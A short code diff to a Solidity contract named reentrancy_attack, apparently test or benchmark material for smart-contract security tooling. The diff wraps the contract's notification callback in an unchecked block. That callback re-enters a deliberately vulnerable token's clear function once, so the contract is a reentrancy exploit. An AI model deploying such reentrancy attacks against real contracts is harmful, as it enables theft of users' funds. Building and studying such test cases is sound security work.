@@ -80,10 +80,12 @@ contract reentrancy_attack {
         _to = __to;
     }
     function receiveNotification(uint256) public {
-        if (count < 1) {
-            count++;
-            multiVulnToken.clear(_to);
-        }
+        unchecked {	
+		    if (count < 1) {
+		        count++;
+		        multiVulnToken.clear(_to);
+		    }
+		}
     }
     function attack() public {
         multiVulnToken.clear(_to);
